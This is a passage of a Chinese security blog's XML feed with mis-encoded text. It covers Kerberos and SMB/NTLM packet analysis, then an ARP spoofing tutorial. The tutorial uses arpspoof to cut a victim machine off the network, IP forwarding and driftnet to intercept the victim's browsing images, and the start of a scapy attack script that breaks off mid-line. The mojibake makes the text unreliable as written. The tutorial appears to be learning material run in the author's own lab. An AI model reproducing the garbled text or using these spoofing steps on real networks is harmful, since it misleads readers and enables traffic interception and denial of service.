è¿™ä¸ªæ˜¯å¯ç”¨PAC(ä¸€ä¸ªæ§åˆ¶ç”¨æˆ·æƒé™çš„ä¸œè¥¿)æ”¯æŒçš„æ‰©å±•ã€‚<br>4.req-body:è¯·æ±‚ä¸»ä½“ï¼Œä¹ŸåŒ…å«äº†è®¸å¤šä¿¡æ¯.è¿™ä¸ªå¤´é‡Œé¢æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿æ˜¯<br>cname:å­˜å‚¨ç€å‘é€è¯·æ±‚çš„ç”¨æˆ·åï¼ˆæ˜æ–‡ç”¨æˆ·åï¼‰<br>sname:è¿™ä¸ªåŒ…å«çš„æ˜¯æœåŠ¡ç«¯çš„èº«ä»½, åœ¨ASREQé‡Œé¢æ˜¯krbtgt ï¼Œè¿˜æœ‰æ‰€åœ¨åŸŸåç§°ã€‚tillä¸ºåˆ°æœŸæ—¶é—´ï¼Œnonceä¸ºéšæœºç”Ÿæˆæ•°<br>realm:æ‰€åœ¨åŸŸåç§°<br>etype:å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œè¿™ä¸ªhashçš„åŠ å¯†æ–¹å¼</p><p>ä¹‹å‰ä¸€ç›´å›°æ‰°æˆ‘çš„ â€œä¸ºä»€ä¹ˆæœ‰äº›æ–‡ç« è¯´çš„ç¬¬ä¸€æ­¥æ˜¯å‘æœåŠ¡å™¨å‘é€æ˜æ–‡è´¦æˆ·åï¼Œæœ‰äº›æ–‡ç« æ˜¯å‘æœåŠ¡å™¨å‘é€æ—¶é—´æˆ³hashâ€é—®é¢˜æŠ“äº†ä¸€ä¸‹åŒ…å°±æ‡‚äº†..</p><h3 id="ASREP"><a href="#ASREP" class="headerlink" title="ASREP"></a>ASREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125844.png" alt="QQæˆªå›¾20210217125844"></p><p>1.ticket:è¿™ä¸ªå°±æ˜¯TGTäº†ã€‚<br>tkt-vno:ç¥¨æ®æ ¼å¼ç‰ˆæœ¬å·<br>realm:æ‰€åœ¨åŸŸå<br>sname:åŒasres<br>enc-part:è¢«krbtgtå¯†é’¥åŠ å¯†çš„ç¥¨æ®æœ¬ä½“éƒ¨åˆ†<br>2.enc-part:è¢«client hash åŠ å¯†çš„login session key</p><h3 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130159.png" alt="QQæˆªå›¾20210217130159"></p><p>1.ap-req-&gt;â€¦-&gt;tikect: å¯ä»¥å‘ç°TGSREQæŠŠæ•´ä¸ªTGTå‘é€ç»™äº†TGS<br>2ap-req-&gt;â€¦-&gt;authenticator:è¢«login session keyåŠ å¯†çš„æ—¶é—´æˆ³å’Œclient id</p><h3 id="TGSREP"><a href="#TGSREP" class="headerlink" title="TGSREP"></a>TGSREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125903.png" alt="QQæˆªå›¾20210217125903"></p><p>1.tikect:è¿™é‡Œå°±æ˜¯TGSéƒ¨åˆ†äº†ã€‚<br>enc-partï¼šè¿™é‡Œçš„enc-partæ˜¯è¢«æ‰€è¯·æ±‚çš„æœåŠ¡çš„ç”¨æˆ·hashåŠ å¯†çš„<br>2.enc-part:è¢«login session keyåŠ å¯†çš„service session key</p><h1 id="SMBåè®®"><a href="#SMBåè®®" class="headerlink" title="SMBåè®®"></a>SMBåè®®</h1><p>SMBåè®®æ˜¯ä¸€ä¸ªç”¨äºä¸¤å°è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ ã€æ‰“å°æœºã€ä¸²å£ç­‰åŠŸèƒ½çš„åè®®ã€‚<br>ç½‘ä¸Šé‚»å±…åŠŸèƒ½å°±æ˜¯ä¾é SMBåè®®è€Œèµ·çš„ã€‚<br>é€šè¿‡smbåè®®ï¼Œä¸€å°è®¡ç®—æœºå¯ä»¥åœ¨ç»è¿‡smbè®¤è¯åè¯»å†™å¦ä¸€å°è®¡ç®—æœºä¸Šçš„ä¸€äº›æ–‡ä»¶ã€‚<br>smbåè®®ä¸€èˆ¬æ¶è®¾åœ¨NetBiosåè®®ä¹‹ä¸Šã€‚<br>NetBIOS ä½¿ç”¨ä¸‹åˆ—ç«¯å£ï¼šUDP/137ï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰ã€UDP/138ï¼ˆNetBIOS æ•°æ®æŠ¥æœåŠ¡ï¼‰ã€TCP/139ï¼ˆNetBIOS ä¼šè¯æœåŠ¡ï¼‰ï¼›SMB ä½¿ç”¨ä¸‹åˆ—ç«¯å£ï¼šTCP/139ã€TCP/445ã€‚</p><h2 id="SMBè®¤è¯"><a href="#SMBè®¤è¯" class="headerlink" title="SMBè®¤è¯"></a>SMBè®¤è¯</h2><p>å¦‚æœæˆ‘ä»¬æƒ³ä¾é smbåè®®å»è¯»å†™å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå…¶ä¸­çš„SMBè®¤è¯æƒ…å†µæ˜¯å¦‚ä½•å‘¢ï¼Ÿæˆ‘ä»¬ç®€å•åˆ†æä¸€ä¸‹ã€‚</p><p>1.ç‰ˆæœ¬ç¡®ç«‹é˜¶æ®µ<br>2.ç”¨æˆ·è®¤è¯é˜¶æ®µ<br>3.èµ„æºé“¾æ¥é˜¶æ®µ<br>4.èµ„æºè¯»å†™é˜¶æ®µ</p><p>æ›´è¯¦ç»†ä¸€ç‚¹ã€‚<br>1.ç‰ˆæœ¬ç¡®ç«‹é˜¶æ®µã€‚å®¢æˆ·ç«¯å…ˆå‘é€è‡ªå·±æ”¯æŒçš„SMBåè®®ç‰ˆæœ¬ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ”¶åˆ°åå‘å®¢æˆ·ç«¯åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚è‹¥å®¢æˆ·ç«¯æ”¯æŒçš„smbç‰ˆæœ¬æœåŠ¡å™¨å‡ä¸æ”¯æŒï¼Œåˆ™è¿”å› 0XFFFFHï¼Œç»“æŸé€šä¿¡ ã€‚<br>2.ç”¨æˆ·è®¤è¯é˜¶æ®µã€‚ç¡®ç«‹å¥½è®¤è¯ç‰ˆæœ¬åï¼Œå°±æ˜¯å®¢æˆ·ç«¯å‘é€è´¦æˆ·å¯†ç ç»™æœåŠ¡ç«¯è¿›è¡Œèº«ä»½éªŒè¯äº†ã€‚æœåŠ¡å™¨æ”¶åˆ°åè¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥<br>3.èµ„æºé“¾æ¥é˜¶æ®µã€‚ç”¨æˆ·è®¤è¯é€šè¿‡åï¼Œå®¢æˆ·ç«¯å‘é€è‡ªå·±æƒ³è¦è®¿é—®çš„èµ„æºåï¼ŒæœåŠ¡å™¨æ”¶åˆ°åè¿”å›å…è®¸æˆ–æ‹’ç»<br>4.èµ„æºè¯»å†™é˜¶æ®µï¼Œå®¢æˆ·ç«¯å¼€å§‹è¯»å†™æœåŠ¡å™¨ä¸Šæ–‡ä»¶ã€‚</p><p>çœ‹èµ·æ¥æ¯”ntlmå’Œkerberosç®€å•å¤šäº†ã€‚æŠ“åŒ…åˆ†æä¸€ä¸‹ã€‚</p><h3 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h3><p>1.1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯åˆ—å‡ºå½“å‰æ”¯æŒçš„smbç‰ˆæœ¬</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130121.png" alt="QQæˆªå›¾20210217130121"></p><p>1.2æœåŠ¡å™¨è¿”å›å¸Œæœ›çš„SMBç‰ˆæœ¬</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130226.png" alt="QQæˆªå›¾20210217130226"></p><p>1.3è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œæ­¤æ—¶æœåŠ¡å™¨åªæ˜¯é€‰ä¸­äº†SMB2ï¼Œä½†æ˜¯SMB2ä¹Ÿåˆ†äº†å¾ˆå¤šç‰ˆæœ¬ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯è¿˜ä¼šåŸºäºSMB2ç»§ç»­è¿›è¡Œç‰ˆæœ¬é—®è¯¢</p><img src="http://www.const27.com/wp-content/uploads/2020/11/image-10.png" alt="img" style="zoom:150%;" /><p>ç„¶åæœåŠ¡å™¨å†ç»§ç»­é€‰æ‹©ä¸€ä¸ªç»†åˆ†ç‰ˆæœ¬ï¼Œç‰ˆæœ¬åå•†ç»“æŸ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130238.png" alt="QQæˆªå›¾20210217130238"></p><p>2.1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯æä¾›ç”¨æˆ·ä¿¡æ¯ã€‚SMBåè®®çš„è¿™ä¸€ä¸ªéƒ¨åˆ†ä½¿ç”¨NTLMåè®®å®Œæˆçš„ã€‚å»ºè®®å…ˆçœ‹çœ‹NTLMè®¤è¯å†è¿‡æ¥<br>é¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚NTLMè®¤è¯çš„åŒ…</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130252.png" alt="QQæˆªå›¾20210217130252"></p><p>2.2æœåŠ¡ç«¯è¿”å›challenge</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130331.png" alt="QQæˆªå›¾20210217130331"></p><p>2.3 å®¢æˆ·ç«¯å‘é€ç”¨æˆ·åï¼Œè¢«client hashåŠ å¯†çš„challengeï¼ˆNTLM RESPONSEï¼‰ç»™æœåŠ¡ç«¯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130400.png" alt="QQæˆªå›¾20210217130400"></p><p>2.4æœåŠ¡ç«¯è¿›è¡Œè®¤è¯å¤„ç†ï¼Œè¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸‹å›¾æ˜¯æˆåŠŸæ—¶ï¼Œè¿”å› ä¼šè¯å»ºç«‹å­—æ ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130419.png" alt="QQæˆªå›¾20210217130419"></p><p>3.1å®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„èµ„æº</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130431.png" alt="QQæˆªå›¾20210217130431"></p><p>3.2æœåŠ¡ç«¯è¿”å›å…è®¸æˆ–æ‹’ç»</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130454.png" alt="QQæˆªå›¾20210217130454"></p><ol start="4"><li>å„ç§è¯»å†™æ“ä½œè¯·æ±‚</li></ol><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130512.png" alt="QQæˆªå›¾20210217130512"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•&quot;&gt;&lt;a href=&quot;#åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•&quot; class=&quot;headerlink&quot; title=&quot;åŸŸï¼Œå·¥ä½œç»„ï¼Œæ´»åŠ¨ç›®å½•&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>ARPæ¬ºéª—&amp;DNSæ¬ºéª—&amp;macæ³›æ´ªæ”»å‡»</title>
    <link href="http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/"/>
    <id>http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&amp;DNS%E6%AC%BA%E9%AA%97&amp;mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</id>
    <published>2021-06-28T13:51:58.218Z</published>
    <updated>2021-06-28T13:38:48.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arpåè®®ä¸æ¬ºéª—"><a href="#arpåè®®ä¸æ¬ºéª—" class="headerlink" title="arpåè®®ä¸æ¬ºéª—"></a>arpåè®®ä¸æ¬ºéª—</h1><h2 id="ç®€å•æ¦‚è¦ï¼š"><a href="#ç®€å•æ¦‚è¦ï¼š" class="headerlink" title="ç®€å•æ¦‚è¦ï¼š"></a>ç®€å•æ¦‚è¦ï¼š</h2><p>é€šè¿‡æ­¤åè®®æ¥è·å–å±€åŸŸç½‘ä¸­æŸIPåœ°å€çš„macåœ°å€</p><h2 id="ä½œç”¨ï¼š"><a href="#ä½œç”¨ï¼š" class="headerlink" title="ä½œç”¨ï¼š"></a>ä½œç”¨ï¼š</h2><p>åœ¨å±€åŸŸç½‘ä¸­çš„æœºå™¨äº’ç›¸å‘é€æ¶ˆæ¯æ—¶ï¼Œé çš„æ˜¯macåœ°å€ï¼ˆä¹Ÿå«ä»¥å¤ªç½‘åœ°å€ï¼‰æ¥ç¡®å®šç›®çš„åœ°å€çš„ï¼Œè€Œæˆ‘ä»¬åªçŸ¥é“IPåœ°å€ï¼Œæ‰€ä»¥éœ€è¦arpåè®®æ¥æŠŠipåœ°å€æ˜ å°„ä¸ºmacåœ°å€ã€‚ å…·ä½“å®ç°åŸç†æ˜¯ï¼Œæ¯”å¦‚æˆ‘æƒ³çŸ¥é“192.168.1.1çš„macåœ°å€ï¼Œå°±ä¼šåœ¨å¹¿æ’­åŸŸé‡Œå¹¿æ’­arpè¯·æ±‚ï¼Œipä¸æ˜¯192.168.1.1çš„ä¸»æœºä¼šè‡ªåŠ¨å¿½ç•¥è¯·æ±‚ï¼Œè€Œ192.168.1.1ä¸»æœºåˆ™ä¼šåº”ç­”è¯·æ±‚ï¼Œå¹¶è¿”å›è‡ªå·±çš„macåœ°å€(ç”±IPå®šä½åˆ°macåœ°å€)</p><h2 id="arpé«˜é€Ÿç¼“å­˜è¡¨ï¼š"><a href="#arpé«˜é€Ÿç¼“å­˜è¡¨ï¼š" class="headerlink" title="arpé«˜é€Ÿç¼“å­˜è¡¨ï¼š"></a>arpé«˜é€Ÿç¼“å­˜è¡¨ï¼š</h2><p>è¿™ä¸ªè¡¨ç”¨æ¥ç¼“å­˜ ipåœ°å€ä¸macåœ°å€ çš„å¯¹åº”å…³ç³»<br>æœ‰åŠ¨æ€è¡¨å’Œé™æ€è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åŠ¨æ€è¡¨éšæ—¶é—´çš„æ¨ç§»è‡ªåŠ¨æ·»åŠ å’Œåˆ é™¤,æ¯ä¸ªåŠ¨æ€arpç¼“å­˜éƒ½æœ‰è‡ªå·±çš„TTL(ç”Ÿå­˜æ—¶é—´).TTLä¸º0å°±ä¼šè¢«åˆ </span><br><span class="line">é™æ€è¡¨æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ‰‹åŠ¨æ·»åŠ å’Œåˆ é™¤ã€‚</span><br></pre></td></tr></table></figure><p><strong>å±€åŸŸç½‘ä¸­ipåˆ°macåœ°å€è§£æè¿‡ç¨‹ï¼š</strong><br>1.å½“ç¼“å­˜è¡¨ä¸­å­˜åœ¨ç›®çš„IPå¯¹åº”çš„macåœ°å€æ—¶ åˆ™ç›´æ¥è¿”å›ä¸IPå¯¹åº”çš„macåœ°å€<br>2.å½“ç¼“å­˜è¡¨ä¸­æ²¡æœ‰å¯¹åº”å…³ç³»æ—¶,åˆ™å‘å±€åŸŸç½‘ä¸­å‘é€arpå¹¿æ’­è¯·æ±‚ç›®çš„IPçš„macï¼Œæ”¶åˆ°arpåº”ç­”åå°†å¯¹åº”å…³ç³»è®°å½•åˆ°é«˜é€Ÿç¼“å­˜è¡¨ä¸­<br><strong>é«˜é€Ÿç¼“å­˜è¡¨çš„ä¼˜ç¼ºç‚¹</strong>ï¼š<br>ä¼˜ç‚¹ï¼šå‡å°‘ç½‘ç»œé€šä¿¡é‡ï¼Œæé«˜é€šä¿¡æ•ˆç‡<br>ç¼ºç‚¹ï¼šä¼šé€ æˆå®‰å…¨éšæ‚£</p><h2 id="arpåˆ†ç»„æ ¼å¼"><a href="#arpåˆ†ç»„æ ¼å¼" class="headerlink" title="arpåˆ†ç»„æ ¼å¼"></a>arpåˆ†ç»„æ ¼å¼</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144616.png" alt="QQæˆªå›¾20210219144616"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.arpè¯·æ±‚çš„ç›®çš„macåœ°å€  å…¨fæ—¶ä»£è¡¨å¹¿æ’­åœ°å€</span><br><span class="line">2.arpè¯·æ±‚çš„æ¥æºmacåœ°å€</span><br><span class="line">3.å­—æ®µ3 ä»¥å¤ªç½‘å¸§ç±»å‹è¡¨ç¤ºçš„æ˜¯åé¢çš„æ•°æ®ç±»å‹ï¼ŒARPè¯·æ±‚å’ŒARPåº”ç­”è¿™ä¸ªå€¼ä¸º0x0806</span><br><span class="line">4.å­—æ®µ4 è¡¨ç¤ºç¡¬ä»¶åœ°å€çš„ç±»å‹ï¼Œç¡¬ä»¶åœ°å€ä¸åªä»¥å¤ªç½‘ä¸€ç§ï¼Œæ˜¯ä»¥å¤ªç½‘ç±»å‹æ—¶æ­¤å€¼ä¸º1</span><br><span class="line">5.å­—æ®µ5 è¡¨ç¤ºè¦æ˜ å°„çš„åè®®åœ°å€çš„ç±»å‹ï¼Œè¦å¯¹IPv4åœ°å€è¿›è¡Œæ˜ å°„ï¼Œæ­¤å€¼ä¸º0x0800</span><br><span class="line">67.å­—æ®µ6å’Œ7 è¡¨ç¤ºç¡¬ä»¶åœ°å€é•¿åº¦å’Œåè®®åœ°å€é•¿åº¦ï¼ŒMACåœ°å€å 6å­—èŠ‚ï¼ŒIPåœ°å€å 4å­—èŠ‚</span><br><span class="line">8.æ“ä½œç±»å‹å­—æ®µï¼Œå€¼ä¸º1ï¼Œè¡¨ç¤ºè¿›è¡ŒARPè¯·æ±‚ï¼›å€¼ä¸º2ï¼Œè¡¨ç¤ºè¿›è¡ŒARPåº”ç­”ï¼›</span><br><span class="line">               å€¼ä¸º3ï¼Œè¡¨ç¤ºè¿›è¡ŒRARPè¯·æ±‚ï¼›å€¼ä¸º4ï¼Œè¡¨ç¤ºè¿›è¡ŒRARPåº”ç­”ã€‚ï¼ˆé‡è¦ï¼‰</span><br><span class="line">9.å­—æ®µ9 å‘é€ç«¯ARPè¯·æ±‚æˆ–åº”ç­”çš„ç¡¬ä»¶åœ°å€ï¼Œè¿™é‡Œæ˜¯ä»¥å¤ªç½‘åœ°å€ï¼Œå’Œå­—æ®µ2ç›¸åŒã€‚</span><br><span class="line">10.å­—æ®µ10 å‘é€ARPè¯·æ±‚æˆ–åº”ç­”çš„IPåœ°å€ã€‚</span><br><span class="line">11 12.ç›®çš„ç«¯çš„ç¡¬ä»¶åœ°å€å’Œåè®®åœ°å€</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144723.png" alt="QQæˆªå›¾20210219144723"></p><h2 id="å…è´¹arp"><a href="#å…è´¹arp" class="headerlink" title="å…è´¹arp"></a>å…è´¹arp</h2><p>å…è´¹arpæ˜¯æŒ‡ä¸»æœºå‘é€arpæŸ¥æ‰¾è‡ªå·±çš„IPåœ°å€,å‘é€ç«¯çš„åè®®åœ°å€å’Œç›®çš„ç«¯çš„åè®®åœ°å€æ˜¯ä¸€è‡´çš„<br><strong>ä½œç”¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(å¦‚æŸäº›ç½‘å…³è®¾å¤‡ä¼šæ¯éš”ä¸€å®šæ—¶é—´å¹¿æ’­ä¸€æ¬¡å…è´¹arpï¼Œè®©ç½‘ç»œä¸­å…¶ä»–ä¸»æœºæ›´æ–°arpç¼“å­˜è¡¨ä¸­ç½‘å…³çš„macåœ°å€ï¼Œç¼“è§£arpæ”»å‡»æ•ˆæœ)</span><br><span class="line">(å¦‚é»‘å®¢å¯ä»¥ä½¿ç”¨å…è´¹arpï¼Œå°†è™šå‡ä¼ªé€ çš„ ip macå¯¹åº”å…³ç³»é€šè¿‡arpå¹¿æ’­å‡ºå»ï¼Œä½¿ç½‘ç»œä¸­å…¶ä»–ä¸»æœºæ›´æ–°arpç¼“å­˜è¡¨ï¼Œæ›´æ–°å®Œæˆåï¼Œè¿™äº›ä¸»æœºçš„æ•°æ®ä¼šè½¬å‘åˆ°é”™è¯¯çš„macåœ°å€ï¼Œä»è€Œå®ç°arpæ¬ºéª—ï¼‰</span><br><span class="line">2.æ£€æŸ¥å¹¿æ’­åŸŸé‡Œçš„å…¶ä»–ä¸»æœºæœ‰æ²¡æœ‰ä½¿ç”¨è‡ªå·±çš„IPï¼Œå¦‚æœä½¿ç”¨äº†ï¼Œåˆ™ä¼šå¼¹å‡º IPå†²çª å­—æ ·</span><br><span class="line">å…è´¹arpä¸æ™®é€šarpçš„åŒºåˆ«:</span><br><span class="line">æ™®é€šarpçš„è¯·æ±‚æ˜¯ æˆ‘éœ€è¦æŸipçš„macåœ°å€ï¼Œè¯¥IPæ˜¯å…¶ä»–æœºå™¨çš„IPåœ°å€</span><br><span class="line">å…è´¹arpçš„è¯·æ±‚æ˜¯ æˆ‘éœ€è¦æŸIPçš„macåœ°å€ï¼Œè¯¥IPæ˜¯æœºå™¨è‡ªå·±çš„IPåœ°å€ï¼Œèµ·åˆ°å®£å‘Šä½œç”¨ï¼Œå‘å‡ºå»åæ˜¯ä¸å¸Œæœ›å¾—åˆ°å›åº”çš„ï¼Œè‹¥æœ‰å›åº”åˆ™è¯´æ˜äº†IPå†²çªäº†</span><br></pre></td></tr></table></figure><h2 id="ä»£ç†arp"><a href="#ä»£ç†arp" class="headerlink" title="ä»£ç†arp"></a>ä»£ç†arp</h2><p>ä»£ç†arpçš„æ„æ€æ˜¯ï¼Œä¸€ä¸ªä¸»æœºæŠŠè‡ªå·±çš„macåœ°å€ç»™å¦ä¸€å°æœºå™¨ä½¿ç”¨æ¥åº”ç­”å…¶ä»–ä¸»æœºçš„arpè¯·æ±‚ã€‚ å®é™…ä¸Šï¼Œè¿™å·²ç»æ˜¯æŸç§æ„ä¹‰ä¸Šçš„arpæ¬ºéª—</p><h2 id="arpæ”»å‡»"><a href="#arpæ”»å‡»" class="headerlink" title="arpæ”»å‡»"></a>arpæ”»å‡»</h2><h3 id="æ”»å‡»åŸç†ï¼š"><a href="#æ”»å‡»åŸç†ï¼š" class="headerlink" title="æ”»å‡»åŸç†ï¼š"></a>æ”»å‡»åŸç†ï¼š</h3><p>arpæ”»å‡»å°±æ˜¯ä¼ªé€ IPä¸macçš„å¯¹åº”å…³ç³»æ¥å®ç°arpæ¬ºéª—ï¼Œæ”»å‡»è€…åªè¦æŒç»­ä¸æ–­çš„å‘é€ä¼ªé€ çš„arpå“åº”åŒ…å°±èƒ½æ›´æ”¹ç›®æ ‡ä¸»æœºçš„arpç¼“å­˜è¡¨ï¼Œé€ æˆ æ–­ç½‘æ”»å‡» æˆ– ä¸­é—´äººæ”»å‡»</p><h3 id="åˆ©ç”¨arspoofå®ç°æ–­ç½‘æ”»å‡»"><a href="#åˆ©ç”¨arspoofå®ç°æ–­ç½‘æ”»å‡»" class="headerlink" title="åˆ©ç”¨arspoofå®ç°æ–­ç½‘æ”»å‡»"></a>åˆ©ç”¨arspoofå®ç°æ–­ç½‘æ”»å‡»</h3><p>ç”¨kaliå’Œç‰©ç†æœºè¿›è¡Œæµ‹è¯•ï¼Œkaliæ˜¯æ”»å‡»æœºï¼Œç‰©ç†æœºæ˜¯å—å®³è€…<br>é¦–å…ˆæ”¶é›†kaliï¼Œç‰©ç†æœºï¼Œç½‘å…³çš„ipåœ°å€å’Œmac<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150147.png" alt="QQæˆªå›¾20210219150147"></p><p>å‡è®¾æˆ‘ä»¬æƒ³è¦åœ¨å®é™…ä¸­å®æ–½æ”»å‡»ï¼Œé¦–å…ˆéœ€è¦æ‰«æå±€åŸŸç½‘ä¸­çš„IPï¼Œä½†æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªpingå°±å¾ˆæµªè´¹æ—¶é—´äº†ï¼Œæ‰€ä»¥éœ€è¦fpingå‘½ä»¤<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150203.png" alt="QQæˆªå›¾20210219150203"><br>è§£è¯»ä¸€ä¸‹å‘½ä»¤ arpspoof -i kaliç½‘å¡å -t è¢«æ”»å‡»æœºip ç½‘å…³<br>å¥½çš„ï¼Œæˆ‘ä»¬ç‰©ç†æœºæˆåŠŸè¢«æ–­ç½‘<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144847.png" alt="QQæˆªå›¾20210219144847"></p><h2 id="ä½¿ç”¨arpspoofå·¥å…·å’Œdriftnetå·¥å…·æ¥æˆªè·å›¾ç‰‡ï¼Œwiresharkæ¥ç›´æ¥æŠ“åŒ…"><a href="#ä½¿ç”¨arpspoofå·¥å…·å’Œdriftnetå·¥å…·æ¥æˆªè·å›¾ç‰‡ï¼Œwiresharkæ¥ç›´æ¥æŠ“åŒ…" class="headerlink" title="ä½¿ç”¨arpspoofå·¥å…·å’Œdriftnetå·¥å…·æ¥æˆªè·å›¾ç‰‡ï¼Œwiresharkæ¥ç›´æ¥æŠ“åŒ…"></a>ä½¿ç”¨arpspoofå·¥å…·å’Œdriftnetå·¥å…·æ¥æˆªè·å›¾ç‰‡ï¼Œwiresharkæ¥ç›´æ¥æŠ“åŒ…</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144946.png" alt="QQæˆªå›¾20210219144946"><br>ç„¶åæˆ‘ä»¬æ‰§è¡ŒarpspoogæŒ‡ä»¤<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145018.png" alt="QQæˆªå›¾20210219145018"><br>æ­¤æ—¶æˆ‘ä»¬ç‰©ç†æœºå°±èƒ½è¿ä¸Šå¤–ç½‘äº†<br><em>å‘ç‚¹:å¼€å¯ipè½¬å‘åç‰©ç†æœºä¾æ—§ä¸èƒ½è¿ä¸Šå¤–ç½‘.</em> æˆ‘çš„è§£å†³æ–¹æ³•æ˜¯é‡å¯ä¸€ä¸‹ï¼Œå†ä¿®æ”¹ä»¥ä¸‹ip_forwardæ–‡ä»¶ç„¶åç­‰ä¸€ä¼šï¼Œç‰©ç†æœºå°±å¯ä»¥è¿ä¸Šå¤–ç½‘äº†.arpæ¬ºéª—åç‰©ç†æœºç½‘å¯èƒ½ä¼šå¡ã€‚<br>æ­¤æ—¶ï¼Œç‰©ç†æœºå‘ç»™ç½‘å…³çš„é€šä¿¡ä¿¡æ¯æˆ‘ä»¬éƒ½èƒ½è·å¾—åˆ°äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨driftnetå·¥å…·æ•è·ç‰©ç†æœºæ­£åœ¨æµè§ˆçš„å›¾ç‰‡<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219145032.png" alt="QQæˆªå›¾20210219145032"></p><h2 id="arpæ”»å‡»çš„è„šæœ¬ç¼–å†™ï¼š"><a href="#arpæ”»å‡»çš„è„šæœ¬ç¼–å†™ï¼š" class="headerlink" title="arpæ”»å‡»çš„è„šæœ¬ç¼–å†™ï¼š"></a>arpæ”»å‡»çš„è„šæœ¬ç¼–å†™ï¼š</h2><p>arpæ”»å‡»è„šæœ¬éœ€è¦ç”¨åˆ°scapyåº“æ¥å¸®åŠ©æˆ‘ä»¬å®Œæˆarpæ•°æ®åŒ…çš„ç¼–å†™</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è®²è®²é‡Œé¢çš„ä¸€äº›å‡½æ•°(æ²¡æœ‰ç»§ç»­ç ”ç©¶scapyåº“)</span><br><span class="line">get_if_hwaddr(&#39;ç½‘å¡å&#39;)  &#x2F;&#x2F;è·å¾—è‡ªå·±çš„macåœ°å€ï¼Œä¸€èˆ¬å¡«WLANæˆ–eth0</span><br><span 